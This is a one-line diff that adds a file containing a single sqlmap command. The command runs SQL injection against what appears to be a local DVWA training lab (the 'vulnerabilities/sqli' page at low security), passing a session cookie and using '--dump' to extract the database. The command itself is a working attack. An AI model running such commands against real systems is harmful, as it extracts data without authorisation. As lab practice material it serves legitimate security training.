@@ -1,0 +1,1 @@
+>sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=rgpgq2r6u4ug9kfu7v6ashtk83;security=low" --dump
